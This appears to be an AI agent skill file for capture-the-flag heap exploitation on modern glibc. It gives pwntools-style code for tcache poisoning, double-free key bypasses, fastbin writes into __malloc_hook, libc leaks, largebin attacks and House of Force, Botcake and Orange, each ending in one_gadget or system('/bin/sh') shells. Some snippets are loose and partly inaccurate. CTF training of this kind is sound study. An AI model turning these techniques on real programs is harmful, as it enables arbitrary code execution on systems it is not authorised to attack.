---
name: heap-advanced
description: "CTF advanced heap exploitation for modern glibc (2.27-2.35+). Tcache poisoning, tcache dup double-free, tcache key bypass, fastbin dup into stack, fastbin into __malloc_hook, unsorted bin libc leak, largebin attack arbitrary write, House of Force top-chunk overflow, House of Botcake overlapping chunks, House of Orange _IO_FILE attack, GDB pwndbg heap commands, libc fingerprinting. Triggers: 'heap exploitation', 'tcache poisoning', 'tcache dup', 'house of botcake', 'house of force', 'house of orange', 'largebin attack', 'fastbin dup', 'glibc heap', 'malloc hook', 'free hook', '__malloc_hook', 'unsorted bin leak', 'heap pwn'."
---

# CTF Heap Exploitation: Advanced

Modern glibc heap attacks (libc 2.27-2.35+). Assumes basic BOF/UAF knowledge.

## Install

```bash
pip install pwntools --break-system-packages
sudo apt-get install -y gdb gdb-peda libc6-dbg
git clone https://github.com/pwndbg/pwndbg /opt/pwndbg && cd /opt/pwndbg && ./setup.sh
ldd ./challenge | grep libc | awk '{print $3}' | xargs strings | grep "GNU C"
```

---

## Phase 1: Libc & Heap Recon

```python
from pwn import *
elf = ELF('./challenge')
libc = ELF('./libc.so.6')
print(hex(libc.sym['malloc']))
print(hex(libc.sym['__malloc_hook']))   # target for older libcs
print(hex(libc.sym['__free_hook']))     # target for ≤ 2.33
```

```bash
# GDB heap inspection (pwndbg):
heap         # show all chunks
bins         # show all bins (tcache, fastbin, unsorted, small, large)
vis_heap_chunks   # visual heap layout
```

---

## Phase 2: Tcache Attacks (libc 2.27-2.34)

### Tcache Poisoning (libc 2.27-2.28)

```python
from pwn import *
p = process('./challenge')

# Allocate and free two same-size chunks into tcache
alloc(0x40); alloc(0x40)
free(A)       # tcache[0x40]: A → NULL

# Overwrite fd of A via UAF/heap overflow to target address
write(A, p64(target_addr))   # tcache[0x40]: A → target

# Allocate twice → second alloc returns target
alloc(0x40)   # returns A
alloc(0x40)   # returns target (e.g. __free_hook)

write(target, p64(one_gadget))
free(any_chunk)   # triggers one_gadget → shell
```

### Tcache Dup (Double Free, libc 2.27)

```python
# libc 2.27: no double-free check in tcache
alloc(0x40)
free(A); free(A)  # tcache: A → A (circular!)
alloc(0x40)       # returns A, tcache: A → A
alloc(0x40)       # returns A again

# libc 2.28+: key field bypass
write(A, p64(0) + p64(0))   # clear key
free(A)   # second free now works
```

### Tcache Key Bypass (libc 2.29-2.34)

```python
# key = address of tcache_perthread_struct
leak_heap_base()
tcache_struct = heap_base + 0x10
overflow_into_key_byte(0x00)   # zero out key → double free allowed
```

### GLIBC Safe-Linking (2.32+)

```python
# tcache fd = (addr >> 12) XOR next: deobfuscate:
def decrypt_tcache_fd(mangled_fd, chunk_addr):
    return mangled_fd ^ (chunk_addr >> 12)

# heap_base = leaked_fd << 12 (when fd=0 for first tcache entry)
```

---

## Phase 3: Fastbin Attacks (libc 2.23-2.26)

### Fastbin Dup into Stack

```python
alloc(0x60); alloc(0x60)
free(A); free(B); free(A)   # A → B → A (circular)

alloc(0x60)  # returns A
alloc(0x60)  # returns B: overwrite fd:
write(B, p64(stack_target - 0x8))
alloc(0x60)  # returns A
alloc(0x60)  # returns stack_target → write here!
```

### Fastbin into __malloc_hook

```python
libc_base = leaked_libc_addr - libc.sym['puts']
malloc_hook = libc_base + libc.sym['__malloc_hook']
fake_chunk = malloc_hook - 0x23   # size field = 0x7f (valid fast chunk)

alloc(0x60); alloc(0x60)
free(A); free(B); free(A)
alloc(0x60)  # A
alloc(0x60)  # B: overwrite fd:
write(B, p64(fake_chunk))
alloc(0x60)  # A
alloc(0x60)  # fake_chunk near __malloc_hook
write(at_fake_chunk, b'\x00'*0x13 + p64(one_gadget))
alloc(1)     # triggers __malloc_hook → one_gadget
```

---

## Phase 4: Unsorted Bin Leak (libc address)

```python
alloc(0x100)   # chunk to leak
alloc(0x10)    # prevent top-chunk consolidation
free(A)        # goes to unsorted bin

leak = read(A)[:8]
libc_leak = u64(leak)
libc_base = libc_leak - 0x3ebca0   # offset varies by libc version
```

---

## Phase 5: Largebin Attack (libc 2.29+)

```python
# Effect: write heap pointer to arbitrary location
alloc(0x440); alloc(0x10)
free(L1)   # unsorted bin
alloc(0x430)   # L1 moves to largebin

alloc(0x440); alloc(0x10)
free(L2)   # unsorted bin

write(L2, p64(0) + p64(0) + p64(0) + p64(target - 0x20))

alloc(0x430)   # L2 sorted → writes heap+0x20 to target
```

---

## Phase 6: House of Techniques

### House of Force (libc ≤ 2.26)

```python
overflow_top_chunk_size(p64(0xffffffffffffffff))

target = libc_base + libc.sym['__malloc_hook']
delta = target - current_top - 0x10

alloc(delta)   # advance top chunk to target
alloc(0x10)    # returns target → overwrite __malloc_hook
```

### House of Botcake (tcache + unsorted bin, libc 2.29+)

```python
alloc(0x100)  # P
alloc(0x100)  # A
alloc(0x10)   # separator

for _ in range(7): alloc(0x100); free(last_seven)

free(P); free(A)
alloc(0x100)   # pop one from tcache
free(A)        # A in BOTH tcache AND overlaps P in unsorted

alloc(0x120)   # overlapping chunk
write(overlap, p64(target))
alloc(0x100); alloc(0x100)   # returns target
```

### House of Orange (libc ≤ 2.25)

```python
# Corrupt top chunk size → malloc triggers _IO_flush_all_lockp
overflow_top_chunk(p64(0xc01))
alloc(0x1000)  # old top → unsorted bin
# Craft fake _IO_FILE → overwrite _IO_list_all → system("/bin/sh")
```

---

## Phase 7: GDB Heap Commands (pwndbg)

```bash
gdb ./challenge && run
heap             # all chunks with sizes
bins             # tcache, fastbin, unsorted, small, large
vis_heap_chunks  # color-coded visual map
tcache           # show tcache entries per size

one_gadget /lib/x86_64-linux-gnu/libc.so.6
```

---

## Phase 8: Libc Version Fingerprinting

```bash
ldd ./challenge
# From leak: https://libc.blukat.me

python3 -c "
from pwn import *
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
print(hex(libc.sym['system']))
print(hex(libc.sym['__free_hook']))
print(hex(next(libc.search(b'/bin/sh'))))
"
```

**Version notes:**
- libc 2.27-2.28: no tcache integrity checks → easiest attacks
- libc 2.32+: safe-linking (fd XOR'd with addr>>12)
- libc 2.34+: `__malloc_hook`/`__free_hook` removed → use exit hooks or IO_FILE attack

## Output

Save to `.omop/engagement/ctf/pwn/`:
- `exploit.py`: working exploit
- `flag.txt`: captured flag

## Next Phase

→ `ctf-pwn-advanced-exploits` for tcache-stashing, House of Apple 2
→ `ctf-pwn-rop` for ret2libc/ROP chains
